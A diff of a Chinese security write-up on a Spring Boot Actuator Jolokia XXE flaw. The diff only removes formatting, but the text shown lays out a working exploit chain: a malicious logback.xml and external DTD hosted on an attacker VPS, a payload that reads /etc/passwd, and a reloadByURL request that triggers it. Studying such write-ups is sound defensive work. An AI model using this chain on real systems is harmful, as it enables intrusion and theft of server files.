@@ -176,18 +176,16 @@ recordEvents 执行过程，如下
 
 -   在VPS上创建logback.xml，logback中填写jndi服务，当调用时直接触发恶意class。
 
-```{=html}
 <!-- -->
-```
+
     <?xml version="1.0" encoding="utf-8" ?>
     <!DOCTYPE a [ <!ENTITY % remote SYSTEM "http://vps地址/恶意文件.dtd">%remote;%int;]>
     <a>&trick;</a>
 
 -   在VPS上创建ian.dtd
 
-```{=html}
 <!-- -->
-```
+
     <!ENTITY % d SYSTEM "file:///etc/passwd">
     <!ENTITY % int "<!ENTITY trick SYSTEM ':%d;'>">
 
@@ -195,16 +193,14 @@ recordEvents 执行过程，如下
 
 -   开启http服务
 
-```{=html}
 <!-- -->
-```
+
     python -m SimpleHTTPServer 80
 
 -   远程访问logback.xml文件
 
-```{=html}
 <!-- -->
-```
+
     https://www.0-sec.org:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/VPS地址!/logback.xml
 
 ![1.png](./.resource/SpringBootActuatorjolokia配置不当导致的XXE漏洞/media/rId44.png)
